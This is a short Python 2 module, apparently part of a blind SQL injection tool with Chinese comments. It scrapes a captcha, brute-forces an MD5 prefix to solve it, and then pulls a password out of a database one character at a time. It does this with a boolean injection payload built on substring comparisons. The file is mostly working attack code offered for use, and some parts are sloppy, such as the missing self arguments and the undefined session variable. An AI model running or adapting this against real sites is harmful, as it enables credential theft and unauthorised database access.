#!/usr/bin/env python
# -*- coding:utf-8 -*-
import hashlib
from lib.log import logger
from data import DataProcess

__author__ = "LoRexxar"


class ExpandFunction:
    """
    拓展函数，自定义处理复杂情况
    """

    # 从页面中获取验证码
    def __init__(self):
        pass

    def get_code(url):
        r = s.get(url)
        code = r.text.find('==')
        return r.text[code + 3:code + 7]

    # 跑验证码
    def crack_code(code):
        sstr = 10000

        while 1:
            m2 = hashlib.md5()
            m2.update(repr(sstr))
            if m2.hexdigest()[0:4] == code:
                return sstr
                break
            sstr += 1

    # 注当前表数据
    @staticmethod
    def get_password():
        password = ""
        for i in xrange(33):
            for j in range(40, 130):
                payload = "f' || substring(password," + repr(i) + ",1)='" + chr(j) + "'#"
                print payload
                whether = DataProcess.get_data(payload)
                if (whether == 0):
                    strr = j
                    password += chr(strr)
                    print "[*] password: " + password
                    break
        print "[*] password: " + password
